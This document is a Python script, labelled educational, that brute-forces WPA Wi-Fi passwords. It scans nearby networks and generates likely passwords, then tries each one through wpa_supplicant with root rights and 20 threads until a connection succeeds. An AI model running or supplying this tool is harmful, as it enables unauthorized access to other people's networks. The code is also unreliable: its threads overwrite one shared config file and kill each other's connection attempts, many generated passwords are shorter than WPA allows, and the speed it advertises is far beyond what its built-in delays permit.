#!/usr/bin/env python3
"""
WiFi Bruteforce Tool - Educational Only
Smart password generation + high-speed testing
Target: 1000+ passwords in ~15 seconds
"""

import subprocess
import os
import sys
import time
import re
import itertools
import string
import random
import threading
import queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIGURATION
# ============================================================

# Speed tuning
BATCH_SIZE = 50          # Passwords per batch
MAX_WORKERS = 20         # Thread count
TARGET_SPEED = 1000      # Target passwords per 15 seconds

# Character sets
NUMBERS = string.digits
LOWERCASE = string.ascii_lowercase
UPPERCASE = string.ascii_uppercase
LETTERS = string.ascii_letters
SYMBOLS = "!@#$%^&*()_+-=[]{}|;':\",./<>?~`"
ALL_CHARS = LETTERS + NUMBERS + SYMBOLS

# ============================================================
# SMART PASSWORD GENERATOR
# ============================================================

def generate_passwords(max_count=50000):
    """Yields passwords in order of likelihood - smart generation"""
    count = 0
    
    # Level 1: Common number patterns (most common WiFi passwords)
    # 4-digit and 8-digit patterns
    for length in [4, 8, 6, 5, 7, 9, 3]:
        for combo in itertools.product(NUMBERS, repeat=length):
            yield ''.join(combo)
            count += 1
            if count >= max_count:
                return
    
    # Level 2: Common words + numbers (if we still need more)
    common_words = [
        "password", "admin", "wifi", "guest", "home", "net", "family",
        "default", "linksys", "mobile", "hotel", "cafe", "free", "1234"
    ]
    for word in common_words:
        for suffix in ['', '1', '123', '1234', '!', '@']:
            yield word + suffix
            count += 1
            if count >= max_count:
                return
    
    # Level 3: Lowercase letters only
    for length in range(6, 9):
        for combo in itertools.product(LOWERCASE, repeat=length):
            yield ''.join(combo)
            count += 1
            if count >= max_count:
                return
    
    # Level 4: Lowercase + numbers
    chars = LOWERCASE + NUMBERS
    for length in range(6, 8):
        for combo in itertools.product(chars, repeat=length):
            yield ''.join(combo)
            count += 1
            if count >= max_count:
                return
    
    # Level 5: Mixed case + numbers + symbols (short)
    for length in range(6, 9):
        for combo in itertools.product(ALL_CHARS, repeat=length):
            yield ''.join(combo)
            count += 1
            if count >= max_count:
                return


# ============================================================
# WiFi CONNECTION HANDLER
# ============================================================

class WiFiCracker:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.found = False
        self.password = None
        self.attempts = 0
        self.start_time = None
        self.lock = threading.Lock()
        
    def check_dependencies(self):
        """Check if required tools are available"""
        tools = ['iwconfig', 'wpa_supplicant', 'wpa_cli', 'dhcpcd']
        missing = []
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True, text=True)
            if result.returncode != 0:
                missing.append(tool)
        return missing
    
    def scan_networks(self):
        """Scan for available WiFi networks using iwlist"""
        print("[*] Scanning for networks...")
        result = subprocess.run(
            ['sudo', 'iwlist', self.interface, 'scan'],
            capture_output=True, text=True, timeout=30
        )
        
        networks = []
        current_ssid = None
        current_bssid = None
        
        for line in result.stdout.split('\n'):
            if 'ESSID:' in line:
                current_ssid = line.split('ESSID:"')[1].split('"')[0]
            if 'Address:' in line and current_ssid is None:
                current_bssid = line.split('Address: ')[1].strip()
            if current_ssid and 'Encryption key:on' in line:
                networks.append({'ssid': current_ssid, 'bssid': current_bssid})
                current_ssid = None
                current_bssid = None
        
        return networks
    
    def try_password_batch(self, wifi_ssid, password_batch, results_queue):
        """Try a batch of passwords against the network"""
        for pwd in password_batch:
            if self.found:
                return
            
            with self.lock:
                self.attempts += 1
            
            try:
                # Create wpa_supplicant config
                config = f"""
network={{
    ssid="{wifi_ssid}"
    psk="{pwd}"
    key_mgmt=WPA-PSK
    priority=1
}}
"""
                with open('/tmp/wpa_temp.conf', 'w') as f:
                    f.write(config)
                
                # Kill existing wpa_supplicant
                subprocess.run(['sudo', 'pkill', 'wpa_supplicant'], 
                             capture_output=True, timeout=5)
                time.sleep(0.5)
                
                # Try connection
                proc = subprocess.run(
                    ['sudo', 'wpa_supplicant', '-B', '-i', self.interface,
                     '-c', '/tmp/wpa_temp.conf', '-f', '/tmp/wpa.log'],
                    capture_output=True, text=True, timeout=5
                )
                time.sleep(0.8)  # Wait for association
                
                # Check if connected
                result = subprocess.run(
                    ['sudo', 'wpa_cli', '-i', self.interface, 'status'],
                    capture_output=True, text=True, timeout=3
                )
                
                subprocess.run(['sudo', 'pkill', 'wpa_supplicant'], 
                             capture_output=True, timeout=3)
                
                if 'wpa_state=COMPLETED' in result.stdout:
                    self.found = True
                    self.password = pwd
                    results_queue.put(('FOUND', pwd))
                    return
                    
            except Exception as e:
                pass
    
    def crack(self, ssid, max_passwords=5000):
        """Main cracking loop with threading"""
        self.start_time = time.time()
        
        print(f"\n{'='*60}")
        print(f"  Target SSID: {ssid}")
        print(f"  Max passwords to try: {max_passwords}")
        print(f"  Target: 1000 passwords in ~15 seconds")
        print(f"{'='*60}\n")
        
        # Generate password generator
        pwd_gen = generate_passwords(max_passwords)
        
        # Threading setup
        results_queue = queue.Queue()
        batch = []
        total_sent = 0
        
        # Monitor thread for speed
        def speed_monitor():
            while not self.found and total_sent < max_passwords:
                time.sleep(5)
                elapsed = time.time() - self.start_time
                with self.lock:
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    remaining = max_passwords - total_sent
                    eta = remaining / rate if rate > 0 else 0
                    print(f"  [*] {self.attempts} attempts | {rate:.0f} pwd/s | "
                          f"ETA: {eta:.0f}s | Batch: {total_sent} sent")
        
        monitor_thread = threading.Thread(target=speed_monitor, daemon=True)
        monitor_thread.start()
        
        # Main cracking loop
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            
            for pwd in pwd_gen:
                if self.found:
                    break
                    
                batch.append(pwd)
                total_sent += 1
                
                if len(batch) >= BATCH_SIZE or total_sent >= max_passwords:
                    # Submit batch
                    futures.append(
                        executor.submit(
                            self.try_password_batch, ssid, batch, results_queue
                        )
                    )
                    batch = []
                    
                    # Check for results
                    while not results_queue.empty():
                        status, result = results_queue.get()
                        if status == 'FOUND':
                            self.found = True
                            break
                    
                    # Small sleep to prevent overwhelming the radio
                    time.sleep(0.1)
            
            # Wait for remaining futures
            for future in as_completed(futures):
                if self.found:
                    break
        
        elapsed = time.time() - self.start_time
        print(f"\n{'='*60}")
        if self.found:
            print(f"  ✅ PASSWORD FOUND: {self.password}")
            print(f"  Attempts: {self.attempts} in {elapsed:.1f}s")
            print(f"  Rate: {self.attempts/elapsed:.0f} pwd/s")
        else:
            print(f"  ❌ Password not found in {self.attempts} attempts")
            print(f"  Time: {elapsed:.1f}s | Rate: {self.attempts/elapsed:.0f} pwd/s")
        print(f"{'='*60}")
        
        return self.password


# ============================================================
# MAIN
# ============================================================

def main():
    print("""
╔══════════════════════════════════════════════╗
║     WiFi Brute Force Tool - Educational     ║
║     Smart Auto-Generator + High Speed       ║
║     Target: 1000+ passwords in 15s          ║
╚══════════════════════════════════════════════╝
    """)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This script needs root. Run with: sudo python3 wifi_brute.py")
        sys.exit(1)
    
    cracker = WiFiCracker()
    
    # Check dependencies
    missing = cracker.check_dependencies()
    if missing:
        print(f"[!] Missing tools: {', '.join(missing)}")
        print("    Install: pkg install root-repo && pkg install iw wpa-supplicant")
        sys.exit(1)
    
    # Scan or manual entry
    print("[1] Scan for networks")
    print("[2] Enter SSID manually")
    choice = input("\nChoose (1/2): ").strip()
    
    if choice == '1':
        try:
            networks = cracker.scan_networks()
            if not networks:
                print("[!] No WPA/WPA2 networks found")
                sys.exit(1)
            print("\nAvailable networks:")
            for i, net in enumerate(networks[:20]):  # Show first 20
                print(f"  [{i+1}] {net['ssid']} ({net['bssid']})")
            sel = int(input("\nSelect network number: ")) - 1
            ssid = networks[sel]['ssid']
        except:
            print("[!] Scan failed, falling back to manual")
            ssid = input("Enter SSID: ").strip()
    else:
        ssid = input("Enter SSID: ").strip()
    
    if not ssid:
        print("[!] No SSID provided")
        sys.exit(1)
    
    max_pwds = input("Max passwords to try (default 50000): ").strip()
    max_pwds = int(max_pwds) if max_pwds else 50000
    
    cracker.crack(ssid, max_pwds)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
